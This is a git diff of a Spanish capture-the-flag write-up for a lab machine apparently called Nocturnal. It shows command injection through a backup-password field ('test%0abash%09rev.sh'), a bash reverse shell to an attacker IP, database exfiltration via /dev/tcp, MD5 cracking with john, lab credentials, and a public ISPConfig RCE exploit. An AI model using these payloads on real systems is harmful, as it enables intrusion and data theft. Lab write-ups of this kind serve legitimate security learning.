@@ -76,7 +76,7 @@ Agregamos al `/etc/hosts`:
 ![Carga TXT Burp](img/upload_txt_burp.png)
 
 - Luego probamos cambiar el .txt por .pdf 
-- Nos muestra
+![Carga PDF Burp](img/upload_pdf_burp.png)
 
 Ya que no podemos hacer nada con ese archivo mas que cargarlo vamos a utilizar la herramienta wfuzz
 
@@ -99,8 +99,8 @@ ID           Response   Lines    Word       Chars       Payload
 000000194:   200        128 L    248 W      3113 Ch     "amanda" 
 
 - Vemos un usuario amanda que es el que nos interesa.
-- Ponemos en el repeater de Burp username=amanda y veremos lo siguiente.
-- Mostrai img
+- Ponemos en la URL username=amanda y veremos lo siguiente.
+![Carga URL Amanda](img/file_viwer_error.png)
 
 - Nos descargamos el archivo .odt
 - Lo descomprimimos con unzip
@@ -113,19 +113,50 @@ Amanda Nocturnal has set the following temporary password for you: arHkG7HAI68X8
 - Vamos al panel de login de la web
 - Ingresamos con el usuario amanda y passwd arHkG7HAI68X8s1J
 - Nos permite  ir a Go To Admin Panel
+ ![Carga Panel](img/amanda_upload.png)
+
+ 
 - Ahi si observamos a detalle el archivo admin.php nos muestra:
 ```php
 command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
 ```
+- Esto nos permite inyectar codigo al crear una contraseña
 - En la parte de abajo en crear backup ponemos una letra le damos enter y lo interceptamos con burp
-  Luego lo mostramos
+  ![Carga Panel](img/admin_panel_file_structure.png)
+Si ponemos una letra por ejemplo "d" , lo interceptamos con Burpsuite
+ ![Carga Panel](img/admin_normal_burp.png)
 
-- Probaremos con whoami o algun comando para ver si luego nos podemos ejecutar una bash
-- pondremos imagenes
+Luego en nuestra Terminal crearemos un archivo rev.sh
+nano rev.sh
 
+```sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.15.0/443 0>&1
+```
+Luego nos ponemos en escucha 
+```bash
+nc -nlvp 443
+```
+Descargamos el rev.sh con wget de la siguiente manera:
+ ![Carga Panel](img/admin_injection_burp.png)
 
+Ahora la maquina victima ya puede ejecutar nuestra bash
+cambiamos el campo password por: 
+```bash
+test%0abash%09rev.sh
+```
+Enviamos y obtendremos la bash en la terminal en la que estabamos en escucha con nc
 
--nc -nlvp 4444 > nocturnal.db para escuchar
+Nos dirigimos al directorio raiz con cd
+Listamos con ls
+Y veremos nocturnal_database
+cd nocturnal_database/
+nocturnal_database.db
+file nocturnal_database.db
+Esto nos muestra que es sqlite3
+Entonces podemos transferir esta db a nuestra terminal para poder analizarla.
+
+-nc -nlvp 4444 > nocturnal.db para escuchar (en nuestra maquina de atacante)
 Y de la maquina victima haremos un cat nocturnal_database.db > /dev/tcp/10.10.15.0/4444
 Y recibiremos una conexion
 
@@ -139,6 +170,7 @@ entramos a sqlite3
 select * from users;
 | tobias    | 55c82b1ccd55ab219b3b109b07d5061d |
 
+
 Nos sale el usuario tobias y la passwd en formato hash 
 - Metemos el hash en hash.txt
 - cat hash.txt
@@ -147,7 +179,7 @@ Nos sale el usuario tobias y la passwd en formato hash
 ─────┼────────────────────────────────────────
  1   │ tobias:55c82b1ccd55ab219b3b109b07d5061d
 
-- Y con la herramienta john
+- Y con la herramienta john 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5
 ```
@@ -178,8 +210,9 @@ Credenciales válidas:
 ```
 admin : slowmotionapocalypse
 ```
+En el panel Help nnos Muestra la version 
+![ISPConfig Login](img/ispconfig_dashboard.png)
 
-![ISPConfig Login](img/ispconfig_login.png)
 
 ---
 
@@ -188,7 +221,6 @@ admin : slowmotionapocalypse
 Usamos un exploit público de **ISPConfig Authenticated RCE**:
 
 ```bash
-python3 exploit.py http://127.0.0.1:18080 admin slowmotionapocalypse
 
 git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git -q
 
@@ -201,8 +233,6 @@ Esto inyecta un webshell → acceso como **www-data**.
 
 Ahora somos root y podemos extraer la flag de /root/root.txt
 
-
----
 
 
 
@@ -217,8 +247,6 @@ Nmap → ISPConfig panel → Creds admin
    → Exploit RCE → www-data
    → Tobias → PrivEsc → Root
 ```
-
-![Attack Chain](img/attack_chain.png)
 
 ---
 
